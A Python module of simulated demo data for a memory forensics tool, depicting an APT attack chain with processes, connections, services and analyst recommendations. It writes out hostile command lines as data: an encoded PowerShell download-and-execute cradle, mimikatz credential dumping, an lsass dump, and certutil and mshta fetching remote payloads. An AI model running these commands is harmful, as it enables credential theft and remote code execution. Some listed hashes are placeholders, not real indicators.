"""
Enterprise Memory Forensics Platform - Demo Data
=================================================
Realistic simulated forensics data based on Volatility3 / Magnet RAM Capture
output format. Models a full APT attack chain for demonstration purposes.
"""

# =============================================================================
# DEMO PROCESSES  (Volatility: windows.pslist + windows.psscan)
# =============================================================================
DEMO_PROCESSES = [
    # -- Legitimate OS processes --
    {"pid": 4,    "name": "System",         "ppid": 0,    "threads": 96,  "handles": 2341, "create_time": "2024-01-15 08:00:01", "exe_path": ""},
    {"pid": 388,  "name": "smss.exe",        "ppid": 4,    "threads": 2,   "handles": 29,   "create_time": "2024-01-15 08:00:03", "exe_path": "C:\\Windows\\System32\\smss.exe"},
    {"pid": 512,  "name": "csrss.exe",       "ppid": 388,  "threads": 10,  "handles": 512,  "create_time": "2024-01-15 08:00:05", "exe_path": "C:\\Windows\\System32\\csrss.exe"},
    {"pid": 584,  "name": "wininit.exe",     "ppid": 388,  "threads": 3,   "handles": 115,  "create_time": "2024-01-15 08:00:06", "exe_path": "C:\\Windows\\System32\\wininit.exe"},
    {"pid": 640,  "name": "services.exe",    "ppid": 584,  "threads": 8,   "handles": 229,  "create_time": "2024-01-15 08:00:07", "exe_path": "C:\\Windows\\System32\\services.exe"},
    {"pid": 660,  "name": "lsass.exe",       "ppid": 584,  "threads": 12,  "handles": 889,  "create_time": "2024-01-15 08:00:07", "exe_path": "C:\\Windows\\System32\\lsass.exe"},
    {"pid": 740,  "name": "svchost.exe",     "ppid": 640,  "threads": 22,  "handles": 450,  "create_time": "2024-01-15 08:00:09", "exe_path": "C:\\Windows\\System32\\svchost.exe"},
    {"pid": 768,  "name": "svchost.exe",     "ppid": 640,  "threads": 14,  "handles": 310,  "create_time": "2024-01-15 08:00:10", "exe_path": "C:\\Windows\\System32\\svchost.exe"},
    {"pid": 892,  "name": "svchost.exe",     "ppid": 640,  "threads": 11,  "handles": 280,  "create_time": "2024-01-15 08:00:11", "exe_path": "C:\\Windows\\System32\\svchost.exe"},
    {"pid": 1024, "name": "spoolsv.exe",     "ppid": 640,  "threads": 6,   "handles": 120,  "create_time": "2024-01-15 08:01:00", "exe_path": "C:\\Windows\\System32\\spoolsv.exe"},
    {"pid": 1200, "name": "explorer.exe",    "ppid": 1136,  "threads": 55,  "handles": 1200, "create_time": "2024-01-15 08:01:12", "exe_path": "C:\\Windows\\explorer.exe"},
    {"pid": 4100, "name": "notepad.exe",     "ppid": 1200, "threads": 1,   "handles": 35,   "create_time": "2024-01-15 10:02:00", "exe_path": "C:\\Windows\\System32\\notepad.exe"},
    {"pid": 4400, "name": "chrome.exe",      "ppid": 1200, "threads": 30,  "handles": 600,  "create_time": "2024-01-15 10:05:00", "exe_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
    {"pid": 4800, "name": "taskmgr.exe",     "ppid": 1200, "threads": 8,   "handles": 150,  "create_time": "2024-01-15 10:10:00", "exe_path": "C:\\Windows\\System32\\taskmgr.exe"},
    {"pid": 5500, "name": "conhost.exe",     "ppid": 2048, "threads": 3,   "handles": 40,   "create_time": "2024-01-15 09:23:20", "exe_path": "C:\\Windows\\System32\\conhost.exe"},

    # -- MALICIOUS processes --
    {"pid": 1488, "name": "powershell.exe",  "ppid": 1200, "threads": 7,   "handles": 220,  "create_time": "2024-01-15 09:22:11",
     "exe_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ=="},
    {"pid": 1776, "name": "mimikatz.exe",    "ppid": 1488, "threads": 3,   "handles": 45,   "create_time": "2024-01-15 09:23:05",
     "exe_path": "C:\\Users\\Public\\mimikatz.exe",
     "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"},
    {"pid": 2048, "name": "cmd.exe",         "ppid": 1488, "threads": 2,   "handles": 50,   "create_time": "2024-01-15 09:23:18",
     "exe_path": "C:\\Windows\\System32\\cmd.exe",
     "command_line": "cmd.exe /c whoami && net user && ipconfig /all > C:\\Users\\Public\\info.txt"},
    {"pid": 2312, "name": "procdump64.exe",  "ppid": 2048, "threads": 2,   "handles": 30,   "create_time": "2024-01-15 09:24:01",
     "exe_path": "C:\\Users\\Public\\procdump64.exe",
     "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"},
    {"pid": 2560, "name": "mshta.exe",       "ppid": 1200, "threads": 5,   "handles": 110,  "create_time": "2024-01-15 09:30:55",
     "exe_path": "C:\\Windows\\System32\\mshta.exe",
     "command_line": "mshta.exe http://91.108.4.10:8080/payload.hta"},
    {"pid": 2800, "name": "rundll32.exe",    "ppid": 1200, "threads": 4,   "handles": 80,   "create_time": "2024-01-15 09:31:22",
     "exe_path": "C:\\Windows\\System32\\rundll32.exe",
     "command_line": "rundll32.exe C:\\Users\\AppData\\Local\\Temp\\beacon.dll,EntryPoint"},
    {"pid": 3100, "name": "svchost.exe",     "ppid": 512,  "threads": 6,   "handles": 90,   "create_time": "2024-01-15 09:45:00"},  # Wrong parent - PPID spoofing
    {"pid": 3400, "name": "wscript.exe",     "ppid": 1200, "threads": 3,   "handles": 60,   "create_time": "2024-01-15 09:50:11",
     "exe_path": "C:\\Windows\\System32\\wscript.exe",
     "command_line": "wscript.exe C:\\Users\\Public\\dropper.vbs"},
    {"pid": 3700, "name": "certutil.exe",    "ppid": 2048, "threads": 2,   "handles": 25,   "create_time": "2024-01-15 09:55:33",
     "exe_path": "C:\\Windows\\System32\\certutil.exe",
     "command_line": "certutil.exe -urlcache -f http://185.220.101.45/tool.exe C:\\Users\\Public\\tool.exe"},
    {"pid": 5200, "name": "lsass.exe",       "ppid": 584,  "threads": 4,   "handles": 200,  "create_time": "2024-01-15 09:22:00"},  # Second lsass = masquerading indicator
    # In psscan (pool-tag scan) but unlinked from pslist -> DKOM-style hidden process
    {"pid": 6112, "name": "winupdate.exe",   "ppid": 4,    "threads": 2,   "handles": 18,   "create_time": "2024-01-15 09:41:10",
     "in_psscan": True, "in_pslist": False},
]

# =============================================================================
# DEMO NETWORK CONNECTIONS  (Volatility: windows.netscan)
# =============================================================================
DEMO_CONNECTIONS = [
    {"local_address": "192.168.1.50", "local_port": 49201, "remote_address": "185.220.101.45", "remote_port": 443,  "protocol": "TCP", "state": "ESTABLISHED", "pid": 1488, "process": "powershell.exe"},
    {"local_address": "192.168.1.50", "local_port": 49312, "remote_address": "91.108.4.10",    "remote_port": 8080, "protocol": "TCP", "state": "ESTABLISHED", "pid": 2560, "process": "mshta.exe"},
    {"local_address": "192.168.1.50", "local_port": 49512, "remote_address": "45.142.212.100", "remote_port": 4444, "protocol": "TCP", "state": "ESTABLISHED", "pid": 1776, "process": "mimikatz.exe"},
    {"local_address": "192.168.1.50", "local_port": 49620, "remote_address": "185.220.101.45", "remote_port": 80,   "protocol": "TCP", "state": "ESTABLISHED", "pid": 3700, "process": "certutil.exe"},
    {"local_address": "192.168.1.50", "local_port": 49700, "remote_address": "194.165.16.72",  "remote_port": 1337, "protocol": "TCP", "state": "ESTABLISHED", "pid": 2800, "process": "rundll32.exe"},
    {"local_address": "192.168.1.50", "local_port": 49450, "remote_address": "10.10.10.5",     "remote_port": 445,  "protocol": "TCP", "state": "ESTABLISHED", "pid": 768,  "process": "svchost.exe"},
    {"local_address": "0.0.0.0",      "local_port": 3389,  "remote_address": "*",              "remote_port": 0,    "protocol": "TCP", "state": "LISTENING",   "pid": 768,  "process": "svchost.exe"},
    {"local_address": "0.0.0.0",      "local_port": 4444,  "remote_address": "*",              "remote_port": 0,    "protocol": "TCP", "state": "LISTENING",   "pid": 2800, "process": "rundll32.exe"},
    {"local_address": "192.168.1.50", "local_port": 49800, "remote_address": "8.8.8.8",        "remote_port": 53,   "protocol": "UDP", "state": "ESTABLISHED", "pid": 4400, "process": "chrome.exe"},
    {"local_address": "192.168.1.50", "local_port": 49900, "remote_address": "172.217.14.46",  "remote_port": 443,  "protocol": "TCP", "state": "ESTABLISHED", "pid": 4400, "process": "chrome.exe"},
]

# =============================================================================
# DEMO SERVICES  (Volatility: windows.svcscan)
# =============================================================================
DEMO_SERVICES = [
    {"service_name": "wuauserv",  "display_name": "Windows Update",           "state": "running", "binary_path": "C:\\Windows\\system32\\svchost.exe -k netsvcs",                       "start": "auto"},
    {"service_name": "malSvc",    "display_name": "System Telemetry Service", "state": "running", "binary_path": "C:\\Users\\Public\\svc.exe",                                           "start": "SERVICE_AUTO_START"},
    {"service_name": "WinDefend", "display_name": "Windows Defender",         "state": "stopped", "binary_path": "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe",             "start": "auto"},
    {"service_name": "RemoteReg", "display_name": "Remote Registry",          "state": "running", "binary_path": "C:\\Windows\\system32\\svchost.exe -k regsvc",                         "start": "auto"},
    {"service_name": "Cobalt",    "display_name": "Windows Network Cache",    "state": "running", "binary_path": "C:\\Windows\\Temp\\svhost.exe",                                        "start": "SERVICE_AUTO_START"},
]

# =============================================================================
# DEMO COMMAND LINES  (Volatility: windows.cmdline)
# =============================================================================
DEMO_COMMAND_LINES = [
    {"process": "powershell.exe", "pid": 1488,
     "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ=="},
    {"process": "mimikatz.exe",   "pid": 1776,
     "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"},
    {"process": "cmd.exe",        "pid": 2048,
     "command_line": "cmd.exe /c whoami && net user && ipconfig /all > C:\\Users\\Public\\info.txt"},
    {"process": "certutil.exe",   "pid": 3700,
     "command_line": "certutil.exe -urlcache -f http://185.220.101.45/tool.exe C:\\Users\\Public\\tool.exe"},
    {"process": "mshta.exe",      "pid": 2560,
     "command_line": "mshta.exe http://91.108.4.10:8080/payload.hta"},
    {"process": "rundll32.exe",   "pid": 2800,
     "command_line": "rundll32.exe C:\\Users\\AppData\\Local\\Temp\\beacon.dll,EntryPoint"},
    {"process": "wscript.exe",    "pid": 3400,
     "command_line": "wscript.exe C:\\Users\\Public\\dropper.vbs"},
    {"process": "procdump64.exe", "pid": 2312,
     "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"},
]

# =============================================================================
# DEMO STRINGS  (Volatility: windows.strings / malfind artifacts)
# =============================================================================
DEMO_STRINGS = [
    "185.220.101.45",
    "91.108.4.10",
    "45.142.212.100",
    "194.165.16.72",
    "http://185.220.101.45/tool.exe",
    "http://91.108.4.10:8080/payload.hta",
    "C:\\Users\\Public\\lsass.dmp",
    "C:\\Windows\\Temp\\svhost.exe",
    "5f4dcc3b5aa765d61d8327deb882cf99",       # MD5 hash (mimikatz variant)
    "a94a8fe5ccb19ba61c4c0873d391e987dc12c9a3", # SHA1
    "sekurlsa::logonpasswords",
    "privilege::debug",
    "invoke-mimikatz",
    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malSvc",
]

DEMO_SNAPSHOT_META = {
    "snapshot_id": "MEM_DEMO_20240115_abc123def456",
    "name": "WIN10-VICTIM-20240115.raw",
    "file_path": "demo/WIN10-VICTIM-20240115.raw",
    "file_size": 8589934592,
    "acquisition_tool": "Magnet RAM Capture 1.2.0",
    "os": "Windows 10 Pro 22H2 x64",
    "hostname": "WIN10-VICTIM",
    "ip_address": "192.168.1.50",
    "sha256_hash": "a3b4c5d6e7f8a3b4c5d6e7f8a3b4c5d6e7f8a3b4c5d6e7f8a3b4c5d6e7f8a3b4",
}

DEMO_EXECUTIVE_SUMMARY = (
    "DEMO ANALYSIS - WIN10-VICTIM (192.168.1.50) shows critical compromise indicators "
    "consistent with a targeted APT intrusion. mimikatz.exe (PID 1776) was launched by "
    "powershell.exe (PID 1488) via a Base64-encoded download cradle fetching payload from "
    "185.220.101.45:443. procdump64.exe dumped lsass.exe to C:\\Users\\Public\\lsass.dmp "
    "confirming credential theft. A Meterpreter reverse shell is active on port 4444 via "
    "rundll32.exe loading beacon.dll from %%TEMP%%. mshta.exe is executing an HTA payload "
    "from 91.108.4.10:8080. certutil.exe was used as a LOLBAS downloader (T1105). "
    "Windows Defender is STOPPED. A malicious auto-start service 'malSvc' persists in "
    "C:\\Users\\Public. A second lsass.exe (PID 5200) running under wrong parent - rootkit "
    "indicator. IMMEDIATE ISOLATION AND INCIDENT RESPONSE REQUIRED."
)

DEMO_RECOMMENDATIONS = [
    "Immediately isolate WIN10-VICTIM from the network",
    "Reset ALL domain and local credentials - LSASS dump confirmed",
    "Hunt for lateral movement from 45.142.212.100 in SIEM",
    "Block outbound traffic to: 185.220.101.45, 91.108.4.10, 45.142.212.100, 194.165.16.72",
    "Enable Windows Defender (currently STOPPED - likely disabled by attacker)",
    "Review and disable Remote Registry service",
    "Remove malicious service: malSvc (C:\\Users\\Public\\svc.exe)",
    "Remove malicious service: Cobalt (C:\\Windows\\Temp\\svhost.exe)",
    "Image the disk for offline forensic analysis before remediation",
    "Conduct full domain-wide credential reset if domain-joined",
]
